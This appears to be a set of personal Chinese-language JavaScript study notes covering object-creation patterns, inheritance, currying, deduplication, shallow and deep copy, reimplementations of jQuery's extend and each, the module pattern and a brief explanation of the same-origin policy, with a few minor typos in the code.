	  var person = objectFactory(Otaku, 'Kevin', '18')  <-- 这俩一样
	//var person = new Otaku('Kevin', '18')             <--
	console.log(person.name) // Kevin
	console.log(person.habit) // Games
	console.log(person.strength) // 60
	
	person.sayYourName(); // I am Kevin	


类数组

	var array = ['name','age','sex'];
	
	var arraylike={
		0:'name',
		1:'age',
		2:'sex',
		length:3
	}
	
	读写 长度 遍历 都一样
	
	调用数组方法
	
		Arra.prototype.join.call(arraylike,'^');  //name^age^sex
		
		Array.prototype.slice.call(arraylike,0);  //["name", "age", "sex"] 
		
		Array.prototype.map.call(arrayLike, function(item){
		    return item.toUpperCase();
		}); // ["NAME", "AGE", "SEX"]
	
	
	类数组转数组
		var arrayLike = {0: 'name', 1: 'age', 2: 'sex', length: 3 }
		// 1. slice
		Array.prototype.slice.call(arrayLike); // ["name", "age", "sex"] 
		// 2. splice
		Array.prototype.splice.call(arrayLike, 0); // ["name", "age", "sex"] 
		// 3. ES6 Array.from
		Array.from(arrayLike); // ["name", "age", "sex"] 
		// 4. apply
		Array.prototype.concat.apply([], arrayLike)		




创建对象的多种方式
	工厂模式
		function createperson(name){
			//声明一个中间对象 该对象是工厂里的模子  需要多少个  就复制多少个
			var o =new Object();
			//添加我们需要的属性和方法
			o.name= name;
			o.getName=function(){
				console.log(this.name);
	
			};
			return o;
		}
		//创建两个实例
    	var person1 = createPerson('TOM');
        var PerJake = createPerson('Jake');
     	缺点：无法识别对象的类型  当我们声明了100个person对象，那么就有100个getName方法被重新生成  把方法放在原型里就不会有这样的问题

    构造函数模式  

    锚点  --> 模拟new
		function Person(name) {
		    this.name = name;
		    this.getName = function () {
		        console.log(this.name);
		    };
		}
		
		var person1 = new Person('kevin');		
		优点：实例可以识别为一个特定的类型
	
   	 	缺点：每次创建实例时，每个方法都要被创建一次

	构造函数模式优化
		function Person(name) {
		    this.name = name;
		    this.getName = getName;
		}
		
		function getName() {
		    console.log(this.name);
		}
		
		var person1 = new Person('kevin');
		优点：解决了每个方法都要被重新创建的问题
	
		缺点：这叫啥封装……

	原型模式
		function Person(name){
			person.prototype.name="Tom"
			person.prototype.getName=function(){
				console.log(this.name);
			}
		}
		var person1 = new Person();
		
		优点：方法不会重新创建
		缺点： 共享属性方法  不能初始化参数
	
	原型模式优化
		function Person(name) {
		
		}
		
		Person.prototype = {
		    name: 'kevin',
		    getName: function () {
		        console.log(this.name);
		    }
		};
		
		var person1 = new Person();
		优点：封装性好了一点
		
		缺点：重写了原型，丢失了constructor属性		

	原型模式优化
		function Person(name) {
		
		}
		
		Person.prototype = {
		    constructor: Person,   //加上了constructor属性
		    name: 'kevin',
		    getName: function () {
		        console.log(this.name);
		    }
		};
		
		var person1 = new Person();

	组合模式
		构造函数模式与原型模式双剑合璧。
		
		function Person(name) {
		    this.name = name;
		}
		
		Person.prototype = {
		    constructor: Person,
		    getName: function () {
		        console.log(this.name);
		    }
		};
		
		var person1 = new Person();
		优点：该共享的共享，该私有的私有，使用最广泛的方式
		
		缺点：有的人就是希望全部都写在一起，即更好的封装性    


	继承
	
		function Person(name, age) {
		    this.name = name;
		    this.age = age;
		}
		
		Person.prototype.getName = function() {
		    return this.name;
		}
		
		// 构造函数的继承
		function Student(name, age, job) {
		    Person.call(this, name, age);
		    this.job = job;
		}
		
		// 等价于
		//function Student(name, age, job) {
		//    this.name = name;
		//    this.age = age;
		//    this.job = job;
		//}
		

		// 继承原型
		Student.prototype = new Person('a',1);
		
		// 添加更多方法
		Student.prototype.getLive = function() {
			return this.job;
		}
		
		var o = new Student('b', 2,'m');
		console.log(o.getName())
		console.log(o.getLive())
	
	















防抖  如果有人陆续刷卡上车，司机就不会开车。只有别人没刷卡了，司机才开车。

节流  地铁站  上车时间固定  到点关门


柯里化
	fn1()
		curry(sub_curry(fn0))
		// 相当于
		curry(function(){
		    return fn0()
		})
	
	fn1()()
	curry(function(){return   (function(){ return fn0()}) ()     })
	// 相当于
	curry(function(){ return fn0() })
	
	fn()
	// 相当于
	(function(){ return fn0() })()
	// 相当于
	fn0()
	// 执行 fn0 函数，打印 1
	
	用闭包把参数保存起来，当参数的数量足够执行函数了，就开始执行函数
	
	sub_curry返回的这个函数，在参数不全（此处是调用次数不足）的情况是肯定不会触发，因为sub_curry永远都是返回一个新的函数(凑数量）而不会去执行那个函数。



数组去重

	var array = [1, 2,1,2];
	
	function unique(array) {
	    var res = [];
	    for (var i = 0, len = array.length; i < len; i++) {
	        var current = array[i];
	        if (res.indexOf(current) === -1) {
	            res.push(current)
	        }
	    }
	    return res;
	}
	
	console.log(unique(array)); 
	
	去重  双层循环 
	var array = [1, 1, '1', '1'];
	
	function unique(array) {
	    // res用来存储结果
	    var res = [];
	    for (var i = 0, arrayLen = array.length; i < arrayLen; i++) {
	        for (var j = 0, resLen = res.length; j < resLen; j++ ) {
	            if (array[i] === res[j]) {
	                break;
	            }
	        }
	        // 如果array[i]是唯一的，那么执行完循环，j等于resLen
	        if (j === resLen) {
	            res.push(array[i])
	        }
	    }
	    return res;
	}
	
	console.log(unique(array)); // [1, "1"]
	



类型判断

 



浅拷贝  slice  concat


	数组的元素是基本类型  拷贝一份 互不影响
	
	如果是对象或者数组 拷贝引用  一改全改
	
	常规数组
		var arr = ['old', 1, true, null, undefined];       一样
		
		var new_arr = arr.concat();
		
		new_arr[0] = 'new';
		
		console.log(arr) // ["old", 1, true, null, undefined]      一样
		console.log(new_arr) // ["new", 1, true, null, undefined]
	
	对象数组
		var arr = [{old: 'old'}, ['old']];
		
		var new_arr = arr.concat();
		
		arr[0].old = 'new';
		arr[1][0] = 'aaa';
		
		console.log(arr) // [{old: 'new'}, ['new']]
		console.log(new_arr) // [{old: 'new'}, ['new']]	


深拷贝 json 

	用json解析  适用于数组和对象  不能拷函数
	
	var arr = ['old', 1, true, ['old1', 'old2'], {old: 1}]
	
	var new_arr = JSON.parse( JSON.stringify(arr) );
	
	console.log(new_arr);



	实现
	
		浅拷贝
			var shallowCopy = function(obj) {
			    // 只拷贝对象
			    if (typeof obj !== 'object') return;
			    // 根据obj的类型判断是新建一个数组还是对象
			    var newObj = obj instanceof Array ? [] : {};
			    // 遍历obj，并且判断是obj的属性才拷贝
			    for (var key in obj) {
			        if (obj.hasOwnProperty(key)) {
			            newObj[key] = obj[key];
			        }
			    }
			    return newObj;
			}
		
		深拷贝
			var deepCopy = function(obj) {
			    if (typeof obj !== 'object') return;
			    var newObj = obj instanceof Array ? [] : {};
			    for (var key in obj) {
			        if (obj.hasOwnProperty(key)) {
			            newObj[key] = typeof obj[key] === 'object' ? deepCopy(obj[key]) : obj[key];
			        }//  遇到对象数组 则进入 从头遍历  是自身属性 则添加到新数组中
			    }
			    return newObj;
			}	



extend  多用在编写插件
	简写
		(function($){})(jquery) 等价 function fun($){}; fun(jquery)  这种方法多用于存放开发的插件
	
		$(functio(){})  等价 $(document).ready(function(){});
	
	extend({},item1,item2,……)
		用这个方法，可以将所得的结果全部合并在{}中，并返回，而且 不会破坏原有的项的结构。
	
	
	extend(bool,{},item1,item2….)   bool=true 执行深拷贝
	var item={name：“olive”,age:23,address{provice:”河南”,city:”郑州”}};
	
	var item1={sex:”girl”,address{city:”北京”}};
	
	var result=$.extend(true,item,item1);
	
	var result1=$.extend(false,item,item1);
	结果：
		Result={name：“olive”,age:23,sex:”gril”,address:{provice:”河南”,city:”北京”}};
	
		Result1={name：“olive”,age:23,sex:”gril”,address:{ city:”北京”}};
	


 





	exend 第一版本,简单实现浅拷贝
		function extend1() {
		    var target = arguments[0], // 传入的第一个参数 目标对象  A
		        length = arguments.length, // 传入的参数长度(即对象的个数)
		        i = 1; // 由于第一个对象是目标对象,是要接受拷贝过来的值的,所以接下来循环遍历应该从第二个对象开始
		    var name, // 属性名
		        source, // 用于保存被拷贝的源对象(待复制对象) B
		        copyValue; //属性值
		    if(length && length > 1 ) { // 判断传入的对象至少有两个才能拷贝
		        if(Object.prototype.toString.call(target) === '[object Object]') {
		            // 循环遍历传入的源对象
		            for(; i < length; i++) {
		                // 把每个源对象保存给source
		                source = arguments[i]
		                // 判断source是不是对象
		                if(Object.prototype.toString.call(source) === '[object Object]') {
		                    // 遍历对象的属性名
		                    for(name in source) {
		                        console.log('属性名：' + name)
		                        // 保存该属性名对应的属性值
		                        copyValue = source[name]
		                        // 给目标对象新增或改变属性
		                        target[name] = copyValue
		                        // 如果copyValue也是对象,那么继续对它执行拷贝
		                        if(Object.prototype.toString.call(copyValue) === '[object Object]') {
		                            extend1(target[name], copyValue)
		                        }
		                    }
		                } else {
		                    console.error("你需要传入至少两个对象才能执行拷贝")
		                }
		            }
		        } else {
		            console.error("你需要传入至少两个对象才能执行拷贝")
		        }
		    }
		    return target
		}
		
		
		var A = {
		    a: 1,
		    b: { b1: 11, b2: 22 }
		};
		
		var B = {
		    b: { b1: 33, b3: 44 },
		    c: 3
		};
		
		console.log(extend1(A,B))
		
	exend 第二版本,简单实现浅拷贝,加上数组
		function extend2() {
		    var target = arguments[0], // 传入的第一个参数应该是目标对象(即接受拷贝的对象,获得者)
		        length = arguments.length, // 传入的参数长度(即对象的个数)
		        i = 1; // 由于第一个对象是目标对象,是要接受拷贝过来的值的,所以接下来循环遍历应该从第二个对象开始
		    var name, // 用于保存对象遍历时的属性名
		        source, // 用于保存被拷贝的源对象(奉献者)
		        copyValue; // 用户保存对象遍历时的属性值
		    if(length && length > 1 ) { // 判断传入的对象至少有两个才能拷贝
		        if(Object.prototype.toString.call(target) === '[object Object]' ||
		            Object.prototype.toString.call(target) === '[object Array]') {
		            // 循环遍历传入的源对象
		            for(; i < length; i++) {
		                // 把每个源对象保存给source
		                source = arguments[i]
		                // 判断source是不是对象
		                if(Object.prototype.toString.call(source) === '[object Object]' ||
		                    Object.prototype.toString.call(source) === '[object Array]') {
		                    // 遍历对象的属性名
		                    for(name in source) {
		                        // console.log('属性名：' + name)
		                        // 保存该属性名对应的属性值
		                        copyValue = source[name]
		                        // 给目标对象新增或改变属性
		                        target[name] = copyValue
		                        // 如果copyValue也是对象,那么继续对它执行拷贝
		                        if(Object.prototype.toString.call(copyValue) === '[object Object]' ||
		                            Object.prototype.toString.call(copyValue) === '[object Array]') {
		                            extend2(target[name], copyValue)
		                        }
		                    }
		                } else {
		                    console.error("你需要传入至少两个对象才能执行拷贝")
		                }
		            }
		        } else {
		            console.error("你需要传入至少两个对象才能执行拷贝")
		        }
		    }
		    return target
		}
		
		var A = [4, 5, 6, 7, 8, 9];
		
		var B = [1, 2, 3];
		
		console.log(extend2(A,B))
		
	
	 第三版本,深拷贝。
		// 仔细看了原作者的讲解与源码,发现写法不一样,是我考虑的不好
		// 其实他只是在 target[name] = copyValue 这里做了小小的变化。
		// 什么变化呢？
		// 仔细看他深拷贝的代码,他先 src = target[name],这一步操作很巧妙,
		// 不管你原来有没有 target[name] 对应的属性和属性值,
		// 他都默认你有,没有相当于给你添加了对应的属性,当然新添加的属性默认值就是undefined,
		// 如果是undefined我们需要给它个初始值;如果本来就有对应的属性,那更好办了,值本身指向就不一样。
		// 因为如果直接 target[name] = copyValue ,其实相当于让目标对象对应的属性值和源对象对应的属性值指向一样,
		// 所以以上写法就是浅拷贝,而换成 src = target[name],然后把src和copyValue继续传入函数内就可以避免这种情况。
		// 这样不断调用自身函数其实是递归的一种,一直递归到属性值是基本数据类型就停止了,而基本数据类型又是按值传递的,
		// 所以就不用担心共享内存(引用)问题了。(毕竟浅拷贝和深拷贝都是针对引用数据类型的)
		function extend3() {
		    // 由于要考虑新属性值可能是undefined,所以判断条件得改改
		    var target = arguments[0] || {},
		        length = arguments.length,
		        i = 1;
		    // console.log(target)
		    // console.log(length)
		    var name,
		        source,
		        copyValue,
		        last, // 传入的拷贝对象可能既有数组也有对象,如果目标是数组,待拷贝的是对象的话,用来保存对象
		        temporary_targetVal; // 临时储存目标对象属性值,如果原先不存在对应属性,那么值为undefined
		    if(length && length > 1) {
		        if(Object.prototype.toString.call(target) === '[object Object]' ||
		            Object.prototype.toString.call(target) === '[object Array]') {
		                for(; i < length; i++) {
		                    source = arguments[i]
		                    // console.log(source)
		                    if(Object.prototype.toString.call(source) === '[object Object]' || 
		                        Object.prototype.toString.call(source) === '[object Array]') {
		                        // 有可能是源对象是Array,且目标对象是{}
		                        if(Object.prototype.toString.call(source) === '[object Array]' &&
		                            JSON.stringify(target) == '{}') {
		                            target = []
		                        }
		                        if(Object.prototype.toString.call(source) === '[object Object]' &&
		                            Object.prototype.toString.call(target) === '[object Array]') {
		                            // 如果目标是数组,但是拷贝的是普通对象,数组扩容,用来存放拷贝的对象
		                            last = target[target.length] = {}
		                        }
		                        if(Object.prototype.toString.call(source) === '[object Array]' &&
		                            Object.prototype.toString.call(target) === '[object Object]') {
		                            // 如果目标是对象,但是拷贝的是数组,对象值先赋为[]
		                            last = target['arr_' + i] = []
		                            // console.log(last)
		                        }
		                        // console.log(target)
		                        // console.log(source)
		                        for(name in source) {
		                                copyValue = source[name]
		                                if(last) {
		                                    temporary_targetVal = last[name]
		                                } else {
		                                    // console.log(target[name])
		                                    // 保存目标对象对应的属性值,如果该属性不存在则添加且值为undefined
		                                    temporary_targetVal = target[name]
		                                }
		                                // console.log(temporary_targetVal)
		                                // console.log(copyValue)
		
		// ----------------------------------------------------------------------------------------------------
		                                // 防止循环引用,抄的。。。
		                                if(target === copyValue || last === copyValue || 
		                                    temporary_targetVal === copyValue) {
		                                    continue
		                                }
		// ----------------------------------------------------------------------------------------------------
		
		                                // 如果属性值还是对象,那么继续对它执行拷贝
		                                if(Object.prototype.toString.call(copyValue) === '[object Object]' ||
		                                    Object.prototype.toString.call(copyValue) === '[object Array]') {
		                                        // console.log(copyValue)
		                                        // 这边我一开始没有target[name] = ,然后就卡住了,脑子没转过弯
		                                        // 一开始没target[name] = ,页面上只打印第一个属性及属性值,后面直接不管了
		                                        // 然后我找呀找呀,发现没报错,一个个console.log()都有值
		                                        // 这就真的很奇怪了,然后顺着逻辑思考下去,发现我extend3(temporary_targetVal, copyValue)
		                                        // 后的返回值并没有赋给目标,那么目标自然没法接收啊。。。
		                                        if(last) {
		                                            last[name] = extend3(temporary_targetVal, copyValue)
		                                        } else {
		                                            target[name] = extend3(temporary_targetVal, copyValue)
		                                        }    
		                                } else {
		                                    // 这边也是后来填坑
		                                    // 如果数据类型是这样的：
		                                    // 目标 null,第一个源对象:{a: {val: '110'}},第二个源对象:[1, [2, [3]]]
		                                    // 一开始不加这个判断,直接 target[name] = copyValue
		                                    // 那么拷贝第二个源对象的时候,由于第一个值就是基本数据类型,即
		                                    // copyValue = 1,那么target[name] = copyValue就会是
		                                    // {0:1}这种类型,这很明显是错误的。它改变了数据形式,我们需要的应该是：
		                                    // {属性名: [1,[2,[3]]]}这种形式的
		                                    // 所以,这边一开始漏判了一种情况。
		                                    // 目标是普通对象,而拷贝的是数组且数组元素是基本类型 
		                                    if(Object.prototype.toString.call(target) === '[object Object]' &&
		                                        Object.prototype.toString.call(source) === '[object Array]') {
		                                        target['arr_' + i][name] = copyValue
		                                    } else {
		                                        // 如果属性值是基本数据类型,那么直接赋值,不用担心引用了
		                                        target[name] = copyValue
		                                    }
		                                    // console.log(target[name])
		                                }
		                            }
		                        
		                    } else {
		                        console.error("你只能拷贝对象或数组")
		                    }
		                }
		        } else {
		            console.error("目标不能是string,number,boolean")
		        }
		    }
		    return target
		}
		
	
	
	


jQuery.each(object, [callback])


	回调函数拥有两个参数  第一个是对象的成员或数组的引索  第二个是对应的变量或内容
	遍历数组
		$.each([1,2,3],function(k,v){
			console.log("item"+k+":"+v)
		})
		
		//item0:1
		//item1:2
		//item2:3	
	遍历对象
		$.each({ name: "John", lang: "JS" }, function(i, n) {
		    console.log("Name: " + i + ", Value: " + n);
		});
		// Name: name, Value: John
		// Name: lang, Value: JS

	退出循环
		$.each( [0, 1, 2, 3, 4, 5], function(i, n){
		    if (i > 2) return false;
		    console.log( "Item #" + i + ": " + n );
		});		


	第一版 
		function each(obj, callback) {
		    var length, i = 0;
		
		    if ( isArrayLike(obj) ) {
		        length = obj.length;
		        for ( ; i < length; i++ ) {
		            callback(i, obj[i])
		        }
		    } else {
		        for ( i in obj ) {
		            callback(i, obj[i])
		        }
		    }
		
		    return obj;
		}		

		var B=[5, 6, 7];
		
		each(B,function(k,v){
		    console.log("item"+k+":"+v)
		})                                







封装拖拽插件
构造函数中：  属性与方法为当前实例单独拥有，只能被当前实例访问，并且每声明一个实例，其中的方法都会被重新创建一次。
原型中：      属性与方法为所有实例共同拥有，可以被所有实例访问，新声明实例不会重复创建方法。
模块作用域中：属性和方法不能被任何实例访问，但是能被内部方法访问，新声明的实例，不会重复创建相同的方法。




























模块
var Module = (function() {
    function privateMethod() {
        // do something
    }

    return {
        publicMethod: function() {
            // can call privateMethod();
        }
    };
})();

模块
使用函数自执行的方式来模仿块级作用域，这样就提供了一个独立的执行上下文，结合闭包，就为模块化提供了基础
一个模块往往可以包括：私有变量、私有方法、公有变量、公有方法。
(function() {
    // 私有变量
    var age = 20;
    var name = 'Tom';

    // 私有方法
    function getName() {
        return `your name is ` + name;
    }

    // 共有方法
    function getAge() {
        return age;
    }

    // 将引用保存在外部执行环境的变量中，形成闭包，防止该执行环境被垃圾回收
    window.getAge = getAge;
})();

	



从文档服务器之外的服务器里载入脚本有重要的安全隐患

同源策略是对JavaScript代码能够操作哪些Web内容的一条完整的安全限制

同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

所谓"同源"指的是"三个相同"。

协议相同
域名相同
端口相同


如果非同源，共有三种行为受到限制。

（1） Cookie、LocalStorage 和 IndexDB 无法读取。

（2） DOM 无法获得。

（3） AJAX 请求不能发送。






 

